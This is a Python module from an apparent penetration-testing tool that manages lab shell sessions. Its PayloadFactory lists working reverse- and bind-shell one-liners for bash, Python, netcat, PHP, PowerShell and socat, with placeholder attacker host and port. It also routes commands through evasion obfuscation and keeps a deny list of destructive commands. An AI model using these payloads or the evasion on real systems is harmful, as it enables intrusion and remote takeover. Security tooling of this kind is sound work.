"""Reverse-shell session management for Brutal Mode.

Provides an in-memory registry of shell sessions opened during a Brutal Mode
engagement.  Each session wraps a target URL and runs commands against the
lab's ``/api/lab/brutal/exec`` endpoint — commands are never run locally or on
any non-lab infrastructure.

Exports:
    ShellSession       — data class for one shell session
    ShellSessionManager — in-memory CRUD registry
    PayloadFactory     — static catalogue of reverse/bind shell templates
    run_command        — execute a single command via the lab API
    is_dangerous       — heuristic check for destructive commands
"""

import asyncio
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

import httpx

from app.config import get_settings

logger = logging.getLogger("phantomscan.reverse_shell")

# Destructive commands are blocked outright by run_command() and the simulated
# shell — the request never reaches the target and the block is audited.
_DANGEROUS_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\brm\s+-rf\s+/"),
    re.compile(r"\bmkfs\b"),
    re.compile(r"\bdd\s+if=.+of=/dev/\b"),
    re.compile(r":\(\)\s*{\s*:\|\s*:&\s*}\s*;"),  # fork bomb
    re.compile(r"\bshutdown\b"),
    re.compile(r"\breboot\b"),
    re.compile(r"\bhalt\b"),
    re.compile(r"\binit\s+0\b"),
]


def is_dangerous(command: str) -> bool:
    """Return ``True`` if *command* matches a known destructive pattern."""
    for pattern in _DANGEROUS_PATTERNS:
        if pattern.search(command):
            return True
    return False


@dataclass
class ShellSession:
    """A single interactive shell session against a lab target."""

    shell_id: str
    session_id: str
    target_url: str
    actor: str
    os_hint: str = "auto"
    created_at: float = field(default_factory=time.time)
    closed: bool = False
    command_count: int = 0
    last_output: str = ""
    last_exit_code: int | None = None
    commands: list[dict[str, Any]] = field(default_factory=list)


class ShellSessionManager:
    """In-memory registry of :class:`ShellSession` instances."""

    _sessions: dict[str, ShellSession] = {}

    @classmethod
    def create(
        cls,
        session_id: str,
        target_url: str,
        actor: str,
        os_hint: str = "auto",
    ) -> ShellSession:
        shell = ShellSession(
            shell_id=uuid.uuid4().hex[:16],
            session_id=session_id,
            target_url=target_url,
            actor=actor,
            os_hint=os_hint,
        )
        cls._sessions[shell.shell_id] = shell
        return shell

    @classmethod
    def get(cls, shell_id: str) -> ShellSession | None:
        return cls._sessions.get(shell_id)

    @classmethod
    def list(cls, session_id: str | None = None) -> list[ShellSession]:
        shells = sorted(cls._sessions.values(), key=lambda s: s.created_at, reverse=True)
        if session_id is not None:
            shells = [s for s in shells if s.session_id == session_id]
        return shells

    @classmethod
    def close(cls, shell_id: str) -> None:
        shell = cls._sessions.get(shell_id)
        if shell is not None:
            shell.closed = True

    @classmethod
    def serialize(cls, shell: ShellSession) -> dict[str, Any]:
        return {
            "shell_id": shell.shell_id,
            "session_id": shell.session_id,
            "target_url": shell.target_url,
            "os_hint": shell.os_hint,
            "created_at": shell.created_at,
            "closed": shell.closed,
            "command_count": shell.command_count,
            "last_output": shell.last_output,
            "last_exit_code": shell.last_exit_code,
            "commands": shell.commands[-50:],  # keep last 50 for serialisation
            "simulated": False,
        }


class PayloadFactory:
    """Static catalogue of shell payload templates."""

    @staticmethod
    def reverse_shell_payloads() -> list[dict[str, str]]:
        return [
            {
                "name": "Bash TCP",
                "payload": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
                "os": "linux",
            },
            {
                "name": "Python",
                "payload": (
                    'python3 -c \'import socket,subprocess,os;'
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    "s.connect((\"{LHOST}\",{LPORT}));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'"
                ),
                "os": "linux",
            },
            {
                "name": "Netcat OpenBSD",
                "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
                "os": "linux",
            },
            {
                "name": "PHP",
                "payload": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "os": "linux",
            },
            {
                "name": "PowerShell",
                "payload": (
                    "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
                    "$stream = $client.GetStream();"
                    "[byte[]]$bytes = 0..65535|%{0};"
                    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
                    '{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                    '$sendback = (iex $data 2>&1 | Out-String );'
                    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                    "$stream.Write($sendbyte,0,$sendbyte.Length);"
                    "$stream.Flush()}"
                ),
                "os": "windows",
            },
        ]

    @staticmethod
    def bind_shell_payloads() -> list[dict[str, str]]:
        return [
            {
                "name": "Netcat Bind",
                "payload": "nc -lvnp {LPORT} -e /bin/sh",
                "os": "linux",
            },
            {
                "name": "Python Bind",
                "payload": (
                    "python3 -c 'import socket,subprocess;"
                    "s=socket.socket();s.bind((\"\",{LPORT}));s.listen(1);"
                    "c,a=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c,stdout=c,stderr=c)'"
                ),
                "os": "linux",
            },
            {
                "name": "Socat Bind",
                "payload": "socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
                "os": "linux",
            },
        ]


async def _audit_blocked(shell: ShellSession, command: str) -> None:
    """Persist a blocked-destructive-command audit row directly to brutal_ops."""
    try:
        from app.database import create_brutal_op

        await create_brutal_op(
            shell.session_id,
            shell.target_url,
            getattr(shell, "actor", "unknown"),
            "shell_command_blocked",
            status="denied",
            detail="Destructive command blocked",
            payload=command[:2000],
            output="",
        )
    except Exception:
        logger.exception("Failed to audit blocked command")


async def run_command(shell: ShellSession, command: str) -> dict[str, Any]:
    """Execute *command* via the lab's brutal exec API and track it.

    The command is sent as an HTTP POST to the lab target, not run locally.
    Destructive commands are blocked outright and audited before any request.
    """
    settings = get_settings()
    timeout = settings.brutal_command_timeout
    max_commands = settings.brutal_max_commands_per_shell

    if shell.closed:
        return {"output": "", "exit_code": -1, "error": "Shell is closed"}
    if shell.command_count >= max_commands:
        return {"output": "", "exit_code": -1, "error": f"Command budget exhausted ({max_commands})"}

    command = command.strip()
    if not command:
        return {"output": "", "exit_code": -1, "error": "command is empty"}
    if is_dangerous(command):
        await _audit_blocked(shell, command)
        shell.command_count += 1
        shell.last_output = ""
        shell.last_exit_code = -1
        shell.commands.append({
            "command": command,
            "output": "",
            "exit_code": -1,
            "error": "Blocked: destructive command is not allowed",
            "ts": time.time(),
        })
        return {"output": "", "exit_code": -1, "error": "Blocked: destructive command is not allowed"}

    base = shell.target_url
    if "://" in base:
        from urllib.parse import urlparse
        parsed = urlparse(base)
        base = f"{parsed.scheme}://{parsed.netloc}"

    try:
        from app.services.evasion import EvasionStrategy
        evasion = EvasionStrategy()
        if evasion.obfuscate:
            command = evasion.obfuscate_payload(command)
        await evasion.jitter_delay()
        async with httpx.AsyncClient(headers=evasion.headers(), timeout=timeout) as client:
            response = await client.post(
                f"{base}/api/lab/brutal/exec",
                json={"command": command},
            )
            data = response.json()
    except httpx.TimeoutException:
        data = {"output": "(command timed out)", "exit_code": -1}
    except Exception as exc:
        logger.warning("Shell exec error: %s", exc)
        data = {"output": f"(error: {exc})", "exit_code": -1}

    shell.command_count += 1
    shell.last_output = str(data.get("output", ""))[:10_000]
    shell.last_exit_code = data.get("exit_code")
    shell.commands.append({
        "command": command,
        "output": shell.last_output,
        "exit_code": shell.last_exit_code,
        "ts": time.time(),
    })

    return data
